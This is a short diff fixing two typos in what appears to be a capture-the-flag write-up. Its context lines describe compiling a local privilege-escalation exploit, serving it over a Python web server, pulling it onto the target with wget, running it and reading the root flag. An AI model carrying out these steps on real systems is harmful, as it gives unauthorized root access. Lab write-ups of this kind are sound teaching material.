@@ -103,7 +103,7 @@ uploaded it to the target with `wget`. Here's how:
 
 On host:
 ```
-# save the linked exploit at pwn.c
+# save the linked exploit as pwn.c
 $ gcc pwn.c -o pwn
 $ python3 -m http.server 8080
 # we now have a make-shift webserver! 
@@ -116,4 +116,4 @@ $ chmod 777 pwn
 $ ./pwn
 ```
 
-We now have a root shell! Print out `root/root.txt` and win!
+We now have a root shell! Print out `/root/root.txt` and win!
